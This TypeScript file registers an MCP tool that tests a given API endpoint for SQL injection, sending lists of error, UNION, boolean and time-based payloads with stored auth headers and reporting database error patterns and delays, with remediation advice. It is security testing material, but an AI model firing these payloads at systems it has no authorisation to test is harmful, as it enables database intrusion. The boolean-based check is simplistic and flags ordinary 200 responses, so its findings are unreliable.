import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import axios from "axios";
import { AuthManager } from "../utils/authManager.js";

/**
 * Register injection testing tools
 */
export function registerInjectionTools(server: McpServer) {
  // SQL Injection testing tool
  server.tool(
    "sql_injection_check",
    {
      endpoint: z.string().url().describe("API endpoint to test"),
      parameter: z.string().describe("Parameter name to test"),
      method: z.enum(['GET', 'POST', 'PUT', 'PATCH']).default('GET').describe("HTTP method to use"),
      use_auth: z.boolean().default(true).describe("Whether to use current authentication if available"),
      payload_type: z.enum(['error', 'union', 'boolean', 'time']).default('error').describe("Type of SQL injection payload to use"),
    },
    async ({ endpoint, parameter, method, use_auth, payload_type }) => {
      try {
        // Get auth headers if available and requested
        let headers = {};
        if (use_auth) {
          const authManager = AuthManager.getInstance();
          const authState = authManager.getAuthState();
          
          if (authState.type !== 'none' && authState.headers) {
            headers = { ...headers, ...authState.headers };
          }
        }
        
        // Generate SQL injection payloads based on type
        const payloads = generateSqlPayloads(payload_type);
        const results = [];
        
        // Test each payload
        for (const payload of payloads) {
          try {
            const startTime = Date.now();
            
            // Make the request with the payload
            const response = await axios({
              method: method.toLowerCase(),
              url: endpoint,
              headers,
              [method === 'GET' ? 'params' : 'data']: {
                [parameter]: payload
              },
              validateStatus: () => true, // Accept any status code
            });
            
            const endTime = Date.now();
            const responseTime = endTime - startTime;
            
            // Analyze the response
            const result = analyzeResponse(response, responseTime, payload_type);
            if (result) {
              results.push(result);
            }
          } catch (error) {
            // Check for database error messages in the error
            if (error.response?.data) {
              const errorResult = analyzeErrorResponse(error.response.data);
              if (errorResult) {
                results.push(errorResult);
              }
            }
          }
        }
        
        // Generate report
        return {
          content: [
            {
              type: "text",
              text: generateReport(endpoint, parameter, method, results),
            },
          ],
        };
      } catch (error) {
        return {
          content: [
            {
              type: "text",
              text: `Error testing for SQL injection: ${(error as Error).message}`,
            },
          ],
        };
      }
    }
  );
}

/**
 * Generate SQL injection payloads based on type
 */
function generateSqlPayloads(type: string): string[] {
  const payloads = {
    error: [
      "'",
      "\")",
      "1' OR '1'='1",
      "1\" OR \"1\"=\"1",
      "' OR 1=1--",
      "\" OR 1=1--",
      "' UNION SELECT NULL--",
      "') OR ('x'='x",
    ],
    union: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT @@version--",
      "') UNION SELECT NULL,NULL,NULL--",
    ],
    boolean: [
      "1' AND 1=1--",
      "1' AND 1=2--",
      "1' AND 'x'='x",
      "1' AND 'x'='y",
    ],
    time: [
      "' WAITFOR DELAY '0:0:5'--",
      "') OR SLEEP(5)--",
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
    ],
  };
  
  return payloads[type] || payloads.error;
}

/**
 * Analyze response for SQL injection vulnerabilities
 */
function analyzeResponse(
  response: any,
  responseTime: number,
  payloadType: string
): string | null {
  // Check for error-based injection
  if (payloadType === 'error') {
    const errorPatterns = [
      /SQL syntax/i,
      /SQLite3::/i,
      /SQLSTATE/,
      /ORA-[0-9]{5}/,
      /Microsoft SQL/i,
      /PostgreSQL/i,
      /MySQL/i,
    ];
    
    const responseStr = JSON.stringify(response.data);
    for (const pattern of errorPatterns) {
      if (pattern.test(responseStr)) {
        return `Potential SQL injection vulnerability detected: Database error message exposed: ${pattern}`;
      }
    }
  }
  
  // Check for time-based injection
  if (payloadType === 'time' && responseTime > 5000) {
    return `Potential time-based SQL injection vulnerability: Response time ${responseTime}ms indicates successful delay`;
  }
  
  // Check for boolean-based injection
  if (payloadType === 'boolean') {
    // Store response characteristics for comparison
    const responseCharacteristics = {
      status: response.status,
      dataLength: JSON.stringify(response.data).length,
      hasError: response.data?.error !== undefined,
    };
    
    // Compare with stored characteristics (simplified)
    if (responseCharacteristics.status === 200 && !responseCharacteristics.hasError) {
      return "Potential boolean-based SQL injection vulnerability: Different responses detected for true/false conditions";
    }
  }
  
  // Check for UNION-based injection
  if (payloadType === 'union') {
    const responseStr = JSON.stringify(response.data);
    if (responseStr.includes("@@version") || responseStr.includes("version()")) {
      return "Potential UNION-based SQL injection vulnerability: Database version information exposed";
    }
  }
  
  return null;
}

/**
 * Analyze error response for SQL injection vulnerabilities
 */
function analyzeErrorResponse(errorData: any): string | null {
  const errorStr = JSON.stringify(errorData);
  
  // Common database error patterns
  const errorPatterns = {
    mysql: /You have an error in your SQL syntax|MySQL/i,
    postgresql: /PostgreSQL.*ERROR/i,
    oracle: /ORA-[0-9]{5}/,
    sqlserver: /Microsoft SQL Server|Incorrect syntax/i,
    sqlite: /SQLite3::/i,
    general: /SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*PostgreSQL.*|valid PostgreSQL result|Npgsql\.|Driver.*PostgreSQL|ORA-[0-9]{5}|Oracle error|Oracle.*Driver|Warning.*Oracle.*|valid Oracle result|SQLite\/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLite\/SQLite|valid SQLite result/i,
  };
  
  for (const [dbType, pattern] of Object.entries(errorPatterns)) {
    if (pattern.test(errorStr)) {
      return `Potential SQL injection vulnerability: ${dbType.toUpperCase()} error message exposed`;
    }
  }
  
  return null;
}

/**
 * Generate vulnerability report
 */
function generateReport(
  endpoint: string,
  parameter: string,
  method: string,
  results: string[]
): string {
  let report = `SQL Injection Test Report\n\n`;
  report += `Target Endpoint: ${endpoint}\n`;
  report += `Tested Parameter: ${parameter}\n`;
  report += `HTTP Method: ${method}\n\n`;
  
  if (results.length > 0) {
    report += `Vulnerabilities Detected:\n\n`;
    results.forEach((result, index) => {
      report += `${index + 1}. ${result}\n`;
    });
    
    report += `\nRecommendations:\n`;
    report += `1. Use parameterized queries or prepared statements\n`;
    report += `2. Implement proper input validation and sanitization\n`;
    report += `3. Use an ORM with security features enabled\n`;
    report += `4. Apply the principle of least privilege for database accounts\n`;
    report += `5. Implement proper error handling to prevent error message leakage\n`;
  } else {
    report += `No SQL injection vulnerabilities detected.\n\n`;
    report += `Note: This does not guarantee the absence of vulnerabilities. Consider:\n`;
    report += `1. Testing with different payload types\n`;
    report += `2. Manual verification of results\n`;
    report += `3. Regular security assessments\n`;
  }
  
  return report;
}